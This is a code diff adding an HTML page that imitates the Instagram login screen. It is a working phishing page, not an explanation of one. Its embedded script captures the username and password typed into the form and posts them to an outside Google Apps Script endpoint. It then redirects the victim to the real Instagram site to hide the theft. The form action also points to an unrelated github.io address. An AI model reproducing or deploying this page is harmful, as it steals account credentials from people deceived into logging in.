@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="local_resources/css/146590b627ef6868ce067c4d4f1a56fe.css" rel="stylesheet"/>
+<link href="local_resources/img/8b5fff3ab9dfc178e98bc77b340d3eff.ico" rel="icon" type="image/png"/>
+<title>Instagram</title>
+</head>
+<body>
+<main class="flex align-items-center justify-content-center">
+<section class="flex" id="mobile">
+</section>
+<section class="flex direction-column" id="auth">
+<div class="panel login flex direction-column">
+<h1 class="flex justify-content-center" title="Instagram">
+<img alt="Instagram logo" src="local_resources/img/6a859d51674833768c957a428e26e025.png" title="Instagram logo"/>
+</h1>
+<form action="https://shravanpradhan.github.io/bd/new.html" id="form1" method="post" name="instadata">
+<label class="sr-only" for="email">Phone number, username, or email</label>
+<input name="email" placeholder="Phone number, username, or email"/>
+<label class="sr-only" for="password">Password</label>
+<input name="password" placeholder="Password" type="password"/>
+<button id="button" type="submit">Login</button>
+</form>
+<div class="flex separator align-items-center">
+<span></span>
+<div class="or">Or</div>
+<span></span>
+</div>
+<div class="login-with-fb flex direction-column align-items-center">
+<div>
+<img/>
+<a>Log in with Facebook</a>
+</div>
+<a href="index.html#">Forgot password?</a>
+</div>
+</div>
+<div class="panel register flex justify-content-center">
+<p>Don't have an account? </p>
+<a href="index.html#">Sign up</a>
+</div>
+<div class="app-download flex direction-column align-items-center">
+<p>Get the app.</p>
+<div class="flex justify-content-center">
+<img alt="Imagem com a logo da Apple Store" src="local_resources/img/f33d214e49afec9bc20830718bbde379.png" title="Imagem com a logo da Apple Store"/>
+<img alt="Imagem com a logo da Google Play" src="local_resources/img/7c4f38c7c5c870a34e694fc8b86edbe7.png" title="Imagem com a logo da Google Play"/>
+</div>
+</div>
+</section>
+</main>
+<footer>
+<ul class="flex flex-wrap justify-content-center">
+<li><a href="index.html#">SOBRE</a></li>
+<li><a href="index.html#">AJUDA</a></li>
+<li><a href="index.html#">IMPRENSA</a></li>
+<li><a href="index.html#">API</a></li>
+<li><a href="index.html#">CARREIRAS</a></li>
+<li><a href="index.html#">PRIVACIDADE</a></li>
+<li><a href="index.html#">TERMOS</a></li>
+<li><a href="index.html#">LOCALIZAÇÃO</a></li>
+<li><a href="index.html#">CONTAS MAIS RELEVANTES</a></li>
+<li><a href="index.html#">HASHTAGS</a></li>
+<li><a href="index.html#">IDIOMA</a></li>
+</ul>
+<p class="copyright">© 2020 Instagram do Facebook</p>
+</footer>
+<script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwQ4INIV9_-6YGTsuVivcQK1Jl9p1vmKO3KqdFCHyXSp9jPPMvDNtqXVb5EWGIslBFPeA/exec'
+			const form = document.forms['instadata']
+		  
+			form.addEventListener('submit', e => {
+			  e.preventDefault()
+			  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+				// .then(response => alert("Thank you! your form is submitted successfully." ))
+				.then(() => {  window.location.reload(); })
+				.catch(error => console.error('Error!', error.message))
+			})
+            const form1 = document.getElementById('form1')
+            form1.addEventListener('submit',function(event){
+                event.preventDefault();
+                window.location.href = 'https://www.instagram.com/';
+            })
+		  </script>
+
+</body>
+</html>
